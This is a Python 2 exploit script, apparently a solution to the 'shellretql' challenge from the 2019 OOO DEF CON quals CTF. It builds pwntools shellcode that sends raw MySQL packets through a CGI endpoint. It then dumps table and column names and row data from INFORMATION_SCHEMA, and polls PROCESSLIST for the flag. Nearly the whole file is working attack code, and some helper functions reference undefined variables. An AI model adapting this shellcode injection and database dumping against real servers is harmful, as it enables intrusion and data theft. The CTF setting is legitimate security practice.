#!/usr/bin/env python2
from pwn import *
import requests
import re
import string
from pymysql.protocol import MysqlPacket
import unicodedata
import StringIO
import csv
import json

context.arch = "amd64"
context.os = "linux"


class TableDumper:

    def __init__(self, outfile_path=None):
        self.host = "http://shellretql.quals2019.oooverflow.io:9090/"
        self.path = "cgi-bin/index.php"
        self.url = self.host + self.path
        self.html = (
            'X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\n'
            'Content-Type: text/html; charset=UTF-8\r\n\r\n'
            '<html></html>'
        )
        self.delim = 'scc'
        self.count_q = ("select '{delim}',count({col}),'{delim2}' FROM {tbl} {where};")
        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} {where} LIMIT 1 OFFSET {off};"
        self.encod = 'utf8'
        self.data = None
        self.last_r = None
        self.table_len = 0
        self.outfile_path = outfile_path
        self.outfile = None
        self.err_string = 'Error'
        self.VERBOSE = False
        self.recovered_schema = {}

    def build_q(self, q):
        ''' Build out our shellcode query '''
        shellcode = ""
        shellcode += shellcraft.echo(p16(len(q)) + "\x00\x00\x03" + q, 4)
        shellcode += shellcraft.read(4, 'rsp', 200)
        shellcode += shellcraft.pushstr(self.html)
        shellcode += shellcraft.write(1, 'rsp', 500)
        self.data = {"shell": asm(shellcode) + "\x00"}
        return self.data

    def do_request(self):
        ''' Fires post request '''
        self.last_r = requests.post(self.url, data=self.data)
        return self.last_r

    def do_query(self, q):
        ''' Builds and delivers query '''
        self.build_q(q)
        return self.do_request()

    def get_result(self, q):
        ''' Gets result of query between delimiters '''
        res = self.do_query(q)
        # kills unicode bytes
        res = unicodedata.normalize('NFKD', res.text).encode('ascii', 'ignore')
        res = MysqlPacket(res, self.encod).dump()
        try:
            r = res.split(self.delim)[2].split(self.delim[::-1])[0]
        except IndexError:
            if self.VERBOSE:
                print res
            r = self.err_string
        return r

    def trim(self, s):
        ''' Lazy format cleanup '''
        while s.startswith('.'):
            s = s[1:]
        while s.endswith('.'):
            s = s[:-1]
        if '...' in s:
            s = s.split('...')[0]
        return s

    def get_count(self, tbl, col, set_table_len=False, where=None):
        ''' Returns table len '''
        q = self.count_q.format(
            delim=self.delim,
            col=col,
            delim2=self.delim[::-1],
            tbl=tbl,
            where=where
        )
        res = self.get_result(q)
        while self.err_string == res:
            # server is crapping itself, try again
            res = self.get_result(q)
        c = int(self.trim(res))
        if set_table_len:
            self.table_len = c
            if self.VERBOSE:
                print '{} number of records in tbl {} {}'.format(c, tbl, where)
        return c

    def get_cell(self, tbl, col, off, where=None):
        ''' Returns value in particular cell '''
        q = self.cell_q.format(
            delim=self.delim,
            col=col,
            delim2=self.delim[::-1],
            tbl=tbl,
            off=off,
            where=where
        )
        res = self.get_result(q)
        while self.err_string == res:
            # server is crapping itself, try again
            res = self.get_result(q)
        return res

    def dump_col(self, tbl, col, where=None):
        ''' Get entire column from table '''
        self.get_count(tbl, col, set_table_len=True)
        for off in range(self.table_len):
            r = self.get_cell(tbl, col, off, where)
            if self.VERBOSE:
                print self.trim(r)
            return r

    def dump_row(self, tbl, cols, off=0, where=None):
        ''' Get entire row from table '''
        row = []
        assert(isinstance(row, list))
        for col in cols:
            c = self.get_cell(tbl, col, off, where)
            row.append(self.trim(c))
        return row

    def dump_table(self, tbl, cols, where=None, as_list=False):
        ''' Get entire table '''
        self.get_count(tbl, cols[0], where=where, set_table_len=True)
        ret = []
        for off in range(self.table_len):
            r = self.dump_row(tbl, cols, off, where)
            # get csv-suitable row
            line = StringIO.StringIO()
            writer = csv.writer(line)
            writer.writerow(r)
            v = line.getvalue().strip()
            if self.VERBOSE:
                print v
            if as_list:
                ret.append(v)
        if ret:
            return ret

    def get_table_names(self):
        ''' Get all table names '''
        tbl = 'INFORMATION_SCHEMA.TABLES'
        cols = ['table_name']
        table_names = self.dump_table(tbl, cols, as_list=True)
        for tn in table_names:
            self.recovered_schema[tn] = []

    def get_column_names(self):
        ''' Get column names for all tables in recovered schema '''
        for t in self.recovered_schema.keys():
            tbl = 'INFORMATION_SCHEMA.columns'
            cols = ['column_name']
            where = 'where table_name = \'{}\''.format(t)
            column_names = self.dump_table(tbl, cols, where=where, as_list=True)
            if column_names:
                for cn in column_names:
                    self.recovered_schema[t] = self.recovered_schema[t] + [cn, ]
                print t, self.recovered_schema[t]
            else:
                print 'no columns for {}?'.format(t)

    def get_schema(self):
        ''' Get entire db table and column structure '''
        self.get_table_names()
        self.get_column_names()


def write_datafile(tbl_name, header, data):
    ''' write table data to outfile '''
    f = open('data/{}'.format(tbl), 'w+')
    writer = csv.writer(f)
    writer.writerow(cols)
    for line in l:
        f.write(line)
        f.write('\n')
    f.close()


if __name__ == '__main__':
    d = TableDumper()
    tbl = "INFORMATION_SCHEMA.PROCESSLIST"
    cols = ["COMMAND", "INFO"]
    while True:
        data = d.dump_table(tbl, cols, as_list=True)
        for row in data:
            if 'OOO{' in row:
                row = row[row.index('OOO{'):]
                if '}' in row:
                    print '[+] POSSIBLE FLAG: {}'.format(row[:row.index('}')])
